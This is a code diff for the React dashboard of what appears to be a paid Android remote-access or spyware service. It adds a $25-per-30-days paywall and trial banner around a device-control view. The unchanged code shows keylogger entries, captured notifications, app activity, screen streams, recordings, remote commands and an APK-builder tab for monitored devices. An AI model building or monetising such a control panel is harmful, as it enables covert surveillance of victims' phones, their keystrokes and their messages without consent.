@@ -6,6 +6,7 @@ import Overview from './Overview.jsx';
 import StatusBar from './StatusBar.jsx';
 import SettingsTab from './SettingsTab.jsx';
 import BuildApkTab from './BuildApkTab.jsx';
+import PaywallOverlay from './PaywallOverlay.jsx';
 
 const styles = {
   trialBanner: {
@@ -55,29 +56,41 @@ const styles = {
   },
 };
 
-function TrialBanner({ user }) {
+function TrialBanner({ user, subscription }) {
   if (!user) return null;
-  if (!user.isTrialActive && user.tier === 'free') {
+  const sub = subscription || null;
+  const state = sub?.state || (user.isTrialActive ? (user.tier === 'paid' ? 'paid' : 'trial') : 'expired');
+  const days  = sub?.daysLeft != null ? sub.daysLeft : user.trialDaysLeft;
+
+  if (state === 'expired') {
     return (
       <div style={styles.expiredBanner}>
-        ⚠️ Your 7-day free trial has expired. Please upgrade to continue access.
+        ⚠️ Your free trial has ended — open a device to unlock $25 / 30 days.
       </div>
     );
   }
-  if (user.isTrialActive) {
-    const days = user.trialDaysLeft;
+  if (state === 'paid') {
     return (
-      <div style={styles.trialBanner}>
-        <div style={styles.trialLeft}>
-          ⏱️ <strong>Free Trial:</strong> {days} day{days !== 1 ? 's' : ''} remaining
+      <div style={{ ...styles.trialBanner, background: 'linear-gradient(90deg, rgba(34,197,94,0.12) 0%, rgba(16,185,129,0.12) 100%)', border: '1px solid rgba(34,197,94,0.3)' }}>
+        <div style={{ ...styles.trialLeft, color: '#86efac' }}>
+          ☕ <strong>Paid:</strong> {days != null ? `${days} day${days !== 1 ? 's' : ''} remaining` : 'active'}
         </div>
         <div style={styles.trialRight}>
-          Access ID: <strong style={{ color: '#818cf8' }}>{user.accessId}</strong>
+          Access ID: <strong style={{ color: '#86efac' }}>{user.accessId}</strong>
         </div>
       </div>
     );
   }
-  return null;
+  return (
+    <div style={styles.trialBanner}>
+      <div style={styles.trialLeft}>
+        ⏱️ <strong>Free Trial:</strong> {days} day{days !== 1 ? 's' : ''} remaining
+      </div>
+      <div style={styles.trialRight}>
+        Access ID: <strong style={{ color: '#818cf8' }}>{user.accessId}</strong>
+      </div>
+    </div>
+  );
 }
 
 export default function UserDashboard({ user, onLogout }) {
@@ -97,6 +110,44 @@ export default function UserDashboard({ user, onLogout }) {
   const [deviceLatencies, setDeviceLatencies]         = useState({});
   const pingPendingRef  = useRef({});
   const chunkStreamsRef = useRef({});
+
+  // Live subscription / paywall state. Initialised from the user prop so the
+  // first render is correct, then refreshed from /api/payment/me on mount and
+  // every 60s (and on demand via refreshSubscription()).
+  const [subscription, setSubscription] = useState({
+    state:        user?.isTrialActive
+                    ? (user?.tier === 'paid' ? 'paid' : 'trial')
+                    : 'expired',
+    daysLeft:     user?.trialDaysLeft ?? 0,
+    expiresAt:    user?.paidUntil || user?.trialEndDate || null,
+    isTrialActive: !!user?.isTrialActive,
+  });
+  const [paywall, setPaywall] = useState(null);
+
+  const refreshSubscription = useCallback(async () => {
+    const token = localStorage.getItem('admin_token') || localStorage.getItem('user_token');
+    if (!token) return;
+    try {
+      const r = await fetch('/api/payment/me', { headers: { Authorization: `Bearer ${token}` } });
+      const d = await r.json();
+      if (!d?.success) return;
+      setPaywall(d.paywall || null);
+      setSubscription({
+        state:         d.role === 'admin' ? 'paid' : (d.subscription?.state || (d.isTrialActive ? 'trial' : 'expired')),
+        daysLeft:      d.role === 'admin' ? null : (d.subscription?.daysLeft ?? d.trialDaysLeft ?? 0),
+        expiresAt:     d.subscription?.expiresAt || d.paidUntil || d.trialEndDate || null,
+        isTrialActive: !!d.isTrialActive,
+        email:         d.email,
+        trialEndDate:  d.trialEndDate || null,
+      });
+    } catch (_) { /* network blip — keep prior state */ }
+  }, []);
+
+  useEffect(() => {
+    refreshSubscription();
+    const id = setInterval(refreshSubscription, 60_000);
+    return () => clearInterval(id);
+  }, [refreshSubscription]);
 
   const handleMessage = useCallback((event, data) => {
     switch (event) {
@@ -237,6 +288,12 @@ export default function UserDashboard({ user, onLogout }) {
       case 'offline_recording:saved':
         if (data?.deviceId) setOfflineRecordingVersion(prev => ({ ...prev, [data.deviceId]: (prev[data.deviceId] || 0) + 1 }));
         break;
+      case 'subscription:locked':
+        // The server rejected a command with 402 — flip into locked state
+        // immediately, even if the periodic /api/payment/me poll hasn't run yet.
+        if (data?.paywall) setPaywall(data.paywall);
+        setSubscription(prev => ({ ...prev, state: 'expired', isTrialActive: false, daysLeft: 0 }));
+        break;
       default:
         break;
     }
@@ -276,28 +333,38 @@ export default function UserDashboard({ user, onLogout }) {
           selectedDevice={selectedDevice}
           onSelectDevice={setSelectedDevice}
         />
-        <main className="main-content">
+        <main className="main-content" style={{ position: 'relative' }}>
           {selectedDevice ? (
-            <DeviceControl
-              key={selectedDevice}
-              device={devices.find(d => d.deviceId === selectedDevice) || { deviceId: selectedDevice }}
-              sendCommand={sendCommand}
-              results={commandResults.filter(r => r.deviceId === selectedDevice)}
-              pending={Object.values(pendingCommands).filter(c => c.deviceId === selectedDevice)}
-              onBack={() => setSelectedDevice(null)}
-              streamFrame={streamFrames[selectedDevice] || null}
-              send={send}
-              keylogPushEntries={keylogPushEntries.filter(e => e.deviceId === selectedDevice)}
-              notifPushEntries={notifPushEntries.filter(e => e.deviceId === selectedDevice)}
-              activityAppEntries={activityAppEntries.filter(e => e.deviceId === selectedDevice)}
-              screenReaderPushData={screenReaderPushData[selectedDevice] || null}
-              offlineRecordingVersion={offlineRecordingVersion[selectedDevice] || 0}
-              serverLatency={serverLatency}
-              deviceLatency={deviceLatencies[selectedDevice] ?? null}
-            />
+            subscription.isTrialActive ? (
+              <DeviceControl
+                key={selectedDevice}
+                device={devices.find(d => d.deviceId === selectedDevice) || { deviceId: selectedDevice }}
+                sendCommand={sendCommand}
+                results={commandResults.filter(r => r.deviceId === selectedDevice)}
+                pending={Object.values(pendingCommands).filter(c => c.deviceId === selectedDevice)}
+                onBack={() => setSelectedDevice(null)}
+                streamFrame={streamFrames[selectedDevice] || null}
+                send={send}
+                keylogPushEntries={keylogPushEntries.filter(e => e.deviceId === selectedDevice)}
+                notifPushEntries={notifPushEntries.filter(e => e.deviceId === selectedDevice)}
+                activityAppEntries={activityAppEntries.filter(e => e.deviceId === selectedDevice)}
+                screenReaderPushData={screenReaderPushData[selectedDevice] || null}
+                offlineRecordingVersion={offlineRecordingVersion[selectedDevice] || 0}
+                serverLatency={serverLatency}
+                deviceLatency={deviceLatencies[selectedDevice] ?? null}
+              />
+            ) : (
+              <PaywallOverlay
+                email={subscription.email || user?.email}
+                paywall={paywall}
+                trialEndDate={subscription.trialEndDate || user?.trialEndDate}
+                onBack={() => setSelectedDevice(null)}
+                onRefresh={refreshSubscription}
+              />
+            )
           ) : (
             <div style={{ display: 'flex', flexDirection: 'column', height: '100%' }}>
-              <TrialBanner user={user} />
+              <TrialBanner user={user} subscription={subscription} />
 
               <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 14, paddingBottom: 14, borderBottom: '1px solid #1e1b4b' }}>
                 <div style={{ display: 'flex', gap: 4 }}>
